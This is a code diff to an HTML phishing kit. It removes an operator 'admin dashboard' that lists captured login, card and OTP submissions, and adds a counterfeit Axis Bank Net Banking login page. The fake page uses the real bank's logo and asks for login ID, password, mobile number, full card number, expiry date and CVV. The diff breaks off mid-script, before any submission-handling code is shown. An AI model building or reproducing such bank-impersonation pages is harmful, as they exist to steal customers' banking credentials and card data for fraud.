@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axis Bank Admin Dashboard</title>
+    <title>Axis Bank Net Banking</title>
     <style>
         * {
             margin: 0;
@@ -13,367 +13,497 @@
         }
         
         body {
-            background: #f5f7fa;
-            color: #333;
+            background: #f0f2f5;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
             position: relative;
             overflow-x: hidden;
         }
         
-        /* Live Blink Animation */
-        @keyframes liveBlink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        
-        /* Header */
-        .admin-header {
-            background: linear-gradient(135deg, #d1003a 0%, #b00030 100%);
-            color: white;
-            padding: 20px 40px;
-            box-shadow: 0 4px 15px rgba(209, 0, 58, 0.3);
-            position: sticky;
+        /* Page Load Animation - 8 Times Dot Animation */
+        .page-loader {
+            position: fixed;
             top: 0;
-            z-index: 100;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95); /* White blur background */
+            backdrop-filter: blur(10px);
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .admin-logo {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .admin-logo-circle {
-            width: 50px;
-            height: 50px;
-            background: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loader-container {
+            position: relative;
+            width: 100%;
+            height: 100px;
+        }
+        
+        .loader-dot {
+            width: 15px;
+            height: 15px;
+            background: #87103F; /* Maroon Red */
+            border-radius: 50%;
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: dotAnimation 2.4s linear infinite; /* 8 times in 2.4 seconds */
+            box-shadow: 0 0 15px rgba(135, 16, 63, 0.7);
+        }
+        
+        @keyframes dotAnimation {
+            0% {
+                left: 0;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            6.25% { /* 1/16 = 6.25% */
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+            }
+            12.5% {
+                left: 12.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            18.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+            }
+            25% {
+                left: 25%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            31.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+            }
+            37.5% {
+                left: 37.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            43.75% {
+                width: 40px;
+                height: 40px;
+                opacity: 1;
+            }
+            50% {
+                left: 50%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            56.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+            }
+            62.5% {
+                left: 62.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            68.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+            }
+            75% {
+                left: 75%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            81.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+            }
+            87.5% {
+                left: 87.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+            93.75% {
+                width: 20px;
+                height: 20px;
+                opacity: 1;
+            }
+            100% {
+                left: 100%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+            }
+        }
+        
+        .loader-text {
+            color: #87103F;
+            font-size: 24px;
             font-weight: bold;
-            font-size: 22px;
-            color: #d1003a;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            position: absolute;
+            top: 60%;
+            text-align: center;
+            width: 100%;
+            opacity: 0;
+            animation: fadeInText 1s ease 0.5s forwards;
         }
         
-        .admin-title h1 {
-            font-size: 28px;
-            font-weight: bold;
-            letter-spacing: 0.5px;
+        @keyframes fadeInText {
+            to { opacity: 1; }
         }
         
-        .admin-title p {
-            font-size: 14px;
-            opacity: 0.9;
+        /* Main Container */
+        .main-container {
+            opacity: 0;
+            animation: fadeIn 0.5s ease 3s forwards;
+            flex: 1;
         }
         
-        /* LIVE Indicator */
-        .live-indicator {
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        
+        /* UPDATED HEADER - Slimmer design */
+        .bank-header {
+            background: #87103F; /* Maroon Red */
+            color: white;
+            padding: 15px 40px; /* Reduced from 25px */
+            box-shadow: 0 4px 12px rgba(135, 16, 63, 0.3);
+            position: relative;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
             display: flex;
             align-items: center;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 10px 25px;
-            border-radius: 30px;
-            animation: liveBlink 2s infinite;
-            border: 2px solid rgba(255, 255, 255, 0.3);
+            justify-content: space-between;
         }
         
-        .live-circle {
-            width: 12px;
-            height: 12px;
-            background: #ffcc00;
-            border-radius: 50%;
-            margin-right: 12px;
-            animation: pulse 1.5s infinite;
-            box-shadow: 0 0 10px #ffcc00;
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px; /* Reduced from 20px */
         }
         
-        .live-text {
+        /* Updated Logo with actual Axis Bank logo */
+        .bank-logo {
+            height: 45px; /* Reduced from 60px */
+            width: auto;
+            object-fit: contain;
+            filter: brightness(0) invert(1); /* Makes the logo white */
+        }
+        
+        .bank-title {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .bank-name {
+            font-size: 28px; /* Reduced from 32px */
             font-weight: bold;
-            font-size: 18px;
             letter-spacing: 1px;
         }
         
+        .header-info {
+            text-align: right;
+        }
+        
+        .internet-banking {
+            font-size: 24px; /* Reduced from 28px */
+            font-weight: bold;
+            color: white;
+            margin-bottom: 5px;
+        }
+        
+        .login-using {
+            font-size: 18px; /* Reduced from 20px */
+            opacity: 0.9;
+        }
+        
         /* Main Content */
-        .dashboard-content {
-            padding: 30px 40px 40px;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-        
-        .section-header {
+        .main-content {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            padding: 20px 0;
-            border-bottom: 2px solid #eee;
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+            gap: 40px;
         }
         
-        .section-title {
+        /* Login Box */
+        .login-container {
+            flex: 1;
+            max-width: 500px;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .login-header {
+            background: #87103F;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .login-title {
             font-size: 24px;
             font-weight: bold;
-            color: #d1003a;
+            margin-bottom: 5px;
+        }
+        
+        .login-subtitle {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+        
+        /* Toggle Switch */
+        .toggle-container {
+            display: flex;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50px;
+            padding: 5px;
+            margin: 25px auto 0;
+            width: 80%;
+            position: relative;
+        }
+        
+        .toggle-option {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 1;
+            position: relative;
+            color: white;
+        }
+        
+        .toggle-slider {
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            width: calc(50% - 5px);
+            height: calc(100% - 10px);
+            background: white;
+            border-radius: 50px;
+            transition: transform 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .active-toggle {
+            color: #87103F;
+        }
+        
+        /* Forms */
+        .form-container {
+            padding: 30px;
+        }
+        
+        .login-form {
+            display: block;
+        }
+        
+        .credit-form {
+            display: none;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9f9f9;
+        }
+        
+        .form-input:focus {
+            border-color: #87103F;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #87103F;
+        }
+        
+        /* Login Button */
+        .login-btn-container {
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        
+        .login-button {
+            width: 100%;
+            background: #87103F;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
+        }
+        
+        .login-button:hover {
+            background: #6a0c32;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
+        }
+        
+        .login-button.loading {
+            background: #6a0c32;
+            cursor: not-allowed;
+        }
+        
+        .login-button.loading:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading 0.6s linear infinite;
+        }
+        
+        @keyframes button-loading {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Links */
+        .form-links {
+            text-align: center;
+            margin-top: 25px;
+        }
+        
+        .form-links a {
+            color: #87103F;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 0 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Info Sections */
+        .info-section {
+            flex: 1.5;
+        }
+        
+        .info-card {
+            background: #87103F;
+            color: white;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.2);
+            border-left: 5px solid #ffcc00;
+        }
+        
+        .info-title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
             gap: 10px;
         }
         
-        .section-title i {
-            font-size: 26px;
+        .info-icon {
+            font-size: 24px;
         }
         
-        .refresh-info {
-            background: #d1003a;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        .info-content {
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-size: 16px;
+            opacity: 0.95;
         }
         
-        /* Submissions List */
-        .submissions-list {
+        .info-button {
             background: white;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
-            overflow: hidden;
-            max-height: 700px;
-            overflow-y: auto;
-            border: 1px solid #eee;
-        }
-        
-        /* Individual Submission Card - Different Colors */
-        .submission-card {
-            padding: 25px 30px;
-            border-bottom: 1px solid #f0f0f0;
-            position: relative;
+            color: #87103F;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
             transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         
-        .submission-card:hover {
-            transform: translateX(5px);
-        }
-        
-        /* Card Submission - RED (#d1003a) */
-        .card-submission {
-            border-left: 5px solid #d1003a;
-            background: rgba(209, 0, 58, 0.02);
-        }
-        
-        .card-submission:hover {
-            background: rgba(209, 0, 58, 0.05);
-        }
-        
-        /* Login Submission - BLUE (#0066cc) */
-        .login-submission {
-            border-left: 5px solid #0066cc;
-            background: rgba(0, 102, 204, 0.02);
-        }
-        
-        .login-submission:hover {
-            background: rgba(0, 102, 204, 0.05);
-        }
-        
-        /* OTP Submission - GREEN (#00aa00) */
-        .otp-submission {
-            border-left: 5px solid #00aa00;
-            background: rgba(0, 170, 0, 0.02);
-        }
-        
-        .otp-submission:hover {
-            background: rgba(0, 170, 0, 0.05);
-        }
-        
-        .submission-card.new {
-            animation: blinkCard 5s;
-        }
-        
-        @keyframes blinkCard {
-            0%, 100% { opacity: 1; }
-            10%, 30%, 50%, 70%, 90% { opacity: 0.7; }
-        }
-        
-        .new-badge {
-            position: absolute;
-            top: 20px;
-            right: 30px;
-            background: #d1003a;
-            color: white;
-            font-size: 11px;
-            font-weight: bold;
-            padding: 5px 15px;
-            border-radius: 20px;
-            letter-spacing: 0.5px;
-            animation: pulse 1s infinite;
-            box-shadow: 0 2px 8px rgba(209, 0, 58, 0.3);
-        }
-        
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-        
-        .submission-type {
-            padding: 10px 25px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            color: white;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        
-        /* Card Type - RED */
-        .type-card {
-            background: linear-gradient(135deg, #d1003a, #ff3366);
-        }
-        
-        /* Login Type - BLUE */
-        .type-login {
-            background: linear-gradient(135deg, #0066cc, #3399ff);
-        }
-        
-        /* OTP Type - GREEN */
-        .type-otp {
-            background: linear-gradient(135deg, #00aa00, #00dd00);
-        }
-        
-        .card-time {
-            color: #666;
-            font-size: 14px;
-            font-weight: 500;
-            background: #f5f5f5;
-            padding: 8px 18px;
-            border-radius: 20px;
-            border: 1px solid #eee;
-        }
-        
-        .card-details {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            margin-bottom: 15px;
-        }
-        
-        .detail-item {
-            margin-bottom: 15px;
-        }
-        
-        .detail-label {
-            font-size: 12px;
-            color: #888;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .detail-value {
-            font-size: 16px;
-            font-weight: 500;
-            color: #333;
-            word-break: break-word;
-            padding: 12px 15px;
-            background: #f8f8f8;
-            border-radius: 8px;
-            border: 1px solid #eee;
-        }
-        
-        /* Different border colors for each type */
-        .card-submission .detail-value {
-            border-left: 4px solid #d1003a;
-        }
-        
-        .login-submission .detail-value {
-            border-left: 4px solid #0066cc;
-        }
-        
-        .otp-submission .detail-value {
-            border-left: 4px solid #00aa00;
-        }
-        
-        .page-source {
-            display: inline-block;
-            padding: 8px 18px;
-            border-radius: 15px;
-            font-size: 13px;
-            font-weight: 500;
-            margin-top: 10px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        /* Different page source colors */
-        .card-submission .page-source {
-            background: rgba(209, 0, 58, 0.1);
-            color: #d1003a;
-        }
-        
-        .login-submission .page-source {
-            background: rgba(0, 102, 204, 0.1);
-            color: #0066cc;
-        }
-        
-        .otp-submission .page-source {
-            background: rgba(0, 170, 0, 0.1);
-            color: #00aa00;
-        }
-        
-        /* Empty State */
-        .empty-state {
-            text-align: center;
-            padding: 80px 20px;
-            color: #888;
-        }
-        
-        .empty-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-            opacity: 0.5;
-        }
-        
-        .empty-state h3 {
-            font-size: 22px;
-            margin-bottom: 10px;
-            color: #666;
-        }
-        
-        .empty-state p {
-            font-size: 16px;
-            line-height: 1.5;
+        .info-button:hover {
+            background: #f0f0f0;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
         }
         
         /* Footer */
-        .admin-footer {
-            background: #222;
+        .main-footer {
+            background: #87103F;
             color: white;
             text-align: center;
-            padding: 25px;
-            margin-top: 40px;
+            padding: 30px 20px;
+            margin-top: 50px;
+            box-shadow: 0 -4px 12px rgba(135, 16, 63, 0.3);
         }
         
         .footer-content {
@@ -381,393 +511,581 @@
             margin: 0 auto;
         }
         
+        .footer-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 25px;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        
+        .footer-links a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            text-decoration: underline;
+        }
+        
         .copyright {
             font-size: 14px;
             opacity: 0.8;
-            margin-top: 10px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
         }
         
-        /* Scrollbar Styling */
-        .submissions-list::-webkit-scrollbar {
-            width: 8px;
-        }
-        
-        .submissions-list::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 4px;
-        }
-        
-        .submissions-list::-webkit-scrollbar-thumb {
-            background: #d1003a;
-            border-radius: 4px;
-        }
-        
-        .submissions-list::-webkit-scrollbar-thumb:hover {
-            background: #b00030;
-        }
-        
-        /* Responsive Design */
-        @media (max-width: 1024px) {
-            .card-details {
-                grid-template-columns: repeat(2, 1fr);
+        /* Responsive */
+        @media (max-width: 992px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .login-container {
+                max-width: 100%;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px; /* Reduced */
+            }
+            
+            .logo-section {
+                justify-content: center;
+            }
+            
+            .header-info {
+                text-align: center;
             }
         }
         
         @media (max-width: 768px) {
-            .admin-header {
-                flex-direction: column;
-                text-align: center;
-                padding: 20px;
-                gap: 20px;
+            .bank-header {
+                padding: 12px 20px; /* Reduced */
             }
             
-            .dashboard-content {
+            .bank-name {
+                font-size: 24px; /* Reduced */
+            }
+            
+            .internet-banking {
+                font-size: 22px; /* Reduced */
+            }
+            
+            .login-using {
+                font-size: 16px; /* Reduced */
+            }
+            
+            .main-content {
+                padding: 0 15px;
+                margin: 20px auto;
+            }
+            
+            .info-card {
                 padding: 20px;
             }
             
-            .section-header {
+            .footer-links {
                 flex-direction: column;
                 gap: 15px;
-                text-align: center;
             }
             
-            .card-details {
-                grid-template-columns: 1fr;
-            }
-            
-            .card-header {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            
-            .submission-type {
-                width: 100%;
-                justify-content: center;
-            }
-            
-            .card-time {
-                align-self: flex-start;
+            .bank-logo {
+                height: 40px; /* Further reduced for mobile */
             }
         }
         
-        /* Time badge for new submissions */
-        .time-badge {
-            position: absolute;
-            bottom: 15px;
-            right: 30px;
-            background: #f0f0f0;
-            color: #666;
-            font-size: 11px;
-            padding: 4px 12px;
-            border-radius: 10px;
-            font-weight: 500;
-        }
-        
-        /* Icon styling */
-        .type-icon {
-            font-size: 20px;
-        }
-        
-        .label-icon {
-            font-size: 14px;
-        }
-        
-        .page-icon {
-            font-size: 14px;
+        @media (max-width: 480px) {
+            .bank-header {
+                padding: 10px 15px;
+            }
+            
+            .bank-name {
+                font-size: 20px;
+            }
+            
+            .internet-banking {
+                font-size: 18px;
+            }
+            
+            .login-using {
+                font-size: 14px;
+            }
+            
+            .bank-logo {
+                height: 35px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header class="admin-header">
-        <div class="admin-logo">
-            <div class="admin-logo-circle">A</div>
-            <div class="admin-title">
-                <h1>Axis Bank Admin Dashboard</h1>
-                <p>Real-time Submissions Monitor</p>
-            </div>
-        </div>
-        
-        <div class="live-indicator">
-            <div class="live-circle"></div>
-            <div class="live-text">⭕ LIVE</div>
-        </div>
-    </header>
-    
-    <!-- Submissions Section -->
-    <div class="dashboard-content">
-        <div class="section-header">
-            <div class="section-title">
-                <i>📋</i> Recent Submissions
-            </div>
-            <div class="refresh-info">
-                <span>🔄</span> Auto-refresh in: <span id="refreshTime">5</span>s
-            </div>
-        </div>
-        
-        <div class="submissions-list" id="submissionsList">
-            <!-- Submissions will be loaded here -->
-            <div class="empty-state" id="emptyState">
-                <div class="empty-icon">📭</div>
-                <h3>No submissions yet</h3>
-                <p>Submissions from the login page will appear here automatically</p>
-                <p style="margin-top: 15px; font-size: 14px; color: #d1003a;">
-                    New submissions will blink for 5 seconds and appear at the top
-                </p>
-                <div style="margin-top: 20px; font-size: 13px; color: #666;">
-                    <p>Different colors for different submission types:</p>
-                    <p>💳 Card Submissions: <span style="color: #d1003a;">Red</span></p>
-                    <p>🔐 Login Submissions: <span style="color: #0066cc;">Blue</span></p>
-                    <p>🔢 OTP Submissions: <span style="color: #00aa00;">Green</span></p>
-                </div>
-            </div>
+    <!-- Page Load Animation -->
+    <div class="page-loader" id="pageLoader">
+        <div class="loader-container">
+            <div class="loader-dot"></div>
+            <div class="loader-text">Loading Axis Bank Net Banking...</div>
         </div>
     </div>
     
-    <!-- Footer -->
-    <footer class="admin-footer">
-        <div class="footer-content">
-            <div class="copyright">
-                © 2023 Axis Bank Ltd. All Rights Reserved | Admin Dashboard v2.0
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- UPDATED HEADER - Slimmer with proper logo -->
+        <header class="bank-header">
+            <div class="header-content">
+                <div class="logo-section">
+                    <!-- Actual Axis Bank Logo from URL -->
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Axis_Bank_logo.svg/2560px-Axis_Bank_logo.svg.png" 
+                         alt="Axis Bank Logo" 
+                         class="bank-logo">
+                    <div class="bank-title">
+                        <div class="bank-name">AXIS BANK</div>
+                    </div>
+                </div>
+                
+                <div class="header-info">
+                    <div class="internet-banking">open | INTERNET BANKING</div>
+                    <div class="login-using">Login using</div>
+                </div>
             </div>
-            <div class="copyright" style="margin-top: 10px; font-size: 13px;">
-                Auto-refresh: 5 seconds | New submissions: Blink for 5 seconds | Data stored locally
+        </header>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Login Section -->
+            <div class="login-container">
+                <div class="login-box">
+                    <div class="login-header">
+                        <div class="login-title">Secure Login</div>
+                        <div class="login-subtitle">Access your account safely</div>
+                        
+                        <!-- Toggle Switch -->
+                        <div class="toggle-container">
+                            <div class="toggle-option active-toggle" id="toggleLogin">Login ID</div>
+                            <div class="toggle-option" id="toggleCredit">Credit Card</div>
+                            <div class="toggle-slider" id="toggleSlider"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-container">
+                        <!-- Login ID Form -->
+                        <form class="login-form" id="loginForm">
+                            <div class="form-group">
+                                <label class="form-label" for="loginId">Login / Customer ID</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="loginId" name="loginId" placeholder="Enter your Login ID" required>
+                                    <div class="input-icon">👤</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="password">Password</label>
+                                <div class="input-with-icon">
+                                    <input type="password" class="form-input" id="password" name="password" placeholder="Enter your password" required>
+                                    <div class="input-icon">🔒</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="mobile">Mobile Number</label>
+                                <div class="input-with-icon">
+                                    <input type="tel" class="form-input" id="mobile" name="mobile" placeholder="Registered mobile number" required>
+                                    <div class="input-icon">📱</div>
+                                </div>
+                            </div>
+                            
+                            <div class="login-btn-container">
+                                <button type="submit" class="login-button" id="loginButton">
+                                    Login to Net Banking
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <!-- Credit Card Form -->
+                        <form class="credit-form" id="creditForm">
+                            <div class="form-group">
+                                <label class="form-label" for="cardNumber">16 Digit Card Number</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                                    <div class="input-icon">💳</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="expiry">Expiry Date</label>
+                                <input type="text" class="form-input" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="cvv">CVV</label>
+                                <input type="password" class="form-input" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="cardMobile">Mobile Number</label>
+                                <div class="input-with-icon">
+                                    <input type="tel" class="form-input" id="cardMobile" name="cardMobile" placeholder="Registered mobile number" required>
+                                    <div class="input-icon">📱</div>
+                                </div>
+                            </div>
+                            
+                            <div class="login-btn-container">
+                                <button type="submit" class="login-button" id="creditButton">
+                                    Login with Credit Card
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div class="form-links">
+                            <a href="#" id="forgotLink">Forgot Login ID / Password?</a>
+                            <a href="#">New User? Register Here</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Info Section -->
+            <div class="info-section">
+                <div class="info-card">
+                    <div class="info-title">
+                        <span class="info-icon">🔒</span> Secure & Reliable
+                    </div>
+                    <div class="info-content">
+                        Bank with confidence. Know your digital safety measures.
+                    </div>
+                    <button class="info-button">KNOW MORE</button>
+                </div>
+                
+                <div class="info-card">
+                    <div class="info-title">
+                        <span class="info-icon">📞</span> Get in Touch
+                    </div>
+                    <div class="info-content">
+                        We have got your back when you are stuck.
+                    </div>
+                    <button class="info-button">KNOW MORE</button>
+                </div>
+                
+                <div class="info-card">
+                    <div class="info-title">
+                        <span class="info-icon">📱</span> Get Mobile App
+                    </div>
+                    <div class="info-content">
+                        Download our Axis Bank mobile app on your smartphone.
+                    </div>
+                    <button class="info-button">DOWNLOAD</button>
+                </div>
             </div>
         </div>
-    </footer>
+        
+        <!-- Footer -->
+        <footer class="main-footer">
+            <div class="footer-content">
+                <div class="footer-text">Exclusive offers and products</div>
+                <div class="footer-links">
+                    <a href="#">Contactless enabled Credit Cards</a>
+                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
+                    <a href="#">Experience seamless credit approval</a>
+                    <a href="#">Instant personal loans</a>
+                    <a href="#">Zero balance savings account</a>
+                </div>
+                <div class="copyright">
+                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
+                </div>
+            </div>
+        </footer>
+    </div>
 
     <script>
+        // Page load animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('pageLoader').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('pageLoader').style.display = 'none';
+                }, 500);
+            }, 3000);
+        });
+        
         // DOM elements
-        const submissionsList = document.getElementById('submissionsList');
-        const emptyState = document.getElementById('emptyState');
-        const refreshTime = document.getElementById('refreshTime');
+        const toggleLogin = document.getElementById('toggleLogin');
+        const toggleCredit = document.getElementById('toggleCredit');
+        const toggleSlider = document.getElementById('toggleSlider');
+        const loginForm = document.getElementById('loginForm');
+        const creditForm = document.getElementById('creditForm');
+        const forgotLink = document.getElementById('forgotLink');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+        const cvvInput = document.getElementById('cvv');
+        const loginButton = document.getElementById('loginButton');
+        const creditButton = document.getElementById('creditButton');
         
-        // Timer variables
-        let refreshCountdown = 5;
-        let timerInterval;
+        // Toggle Switch Functionality
+        toggleLogin.addEventListener('click', function() {
+            // Update toggle UI
+            toggleLogin.classList.add('active-toggle');
+            toggleCredit.classList.remove('active-toggle');
+            toggleSlider.style.transform = 'translateX(0)';
+            
+            // Show login form, hide credit form
+            loginForm.style.display = 'block';
+            creditForm.style.display = 'none';
+            
+            // Update forgot link
+            forgotLink.textContent = 'Forgot Login ID / Password?';
+        });
         
-        // Load and display submissions
-        function loadSubmissions() {
-            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+        toggleCredit.addEventListener('click', function() {
+            // Update toggle UI
+            toggleCredit.classList.add('active-toggle');
+            toggleLogin.classList.remove('active-toggle');
+            toggleSlider.style.transform = 'translateX(100%)';
             
-            // Display submissions
-            displaySubmissions(submissions);
-        }
+            // Show credit form, hide login form
+            loginForm.style.display = 'none';
+            creditForm.style.display = 'block';
+            
+            // Update forgot link
+            forgotLink.textContent = 'Forgot Credit Card Details?';
+        });
         
-        // Display submissions in the list
-        function displaySubmissions(submissions) {
-            // Clear list
-            submissionsList.innerHTML = '';
-            
-            if (submissions.length === 0) {
-                submissionsList.appendChild(emptyState);
-                emptyState.style.display = 'block';
-                return;
-            }
-            
-            emptyState.style.display = 'none';
-            
-            // Sort by newest first (new submissions on top)
-            submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-            
-            // Display each submission
-            submissions.forEach((submission, index) => {
-                const card = document.createElement('div');
+        // Format card number input (XXXX XXXX XXXX XXXX)
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = '';
                 
-                // Determine type and set appropriate class
-                let typeClass, cardClass, typeText, typeIcon, typeColorClass;
-                if (submission.type === 'login') {
-                    typeClass = 'type-login';
-                    cardClass = 'login-submission';
-                    typeText = 'LOGIN SUBMISSION';
-                    typeIcon = '🔐';
-                    typeColorClass = 'login';
-                } else if (submission.type === 'credit') {
-                    typeClass = 'type-card';
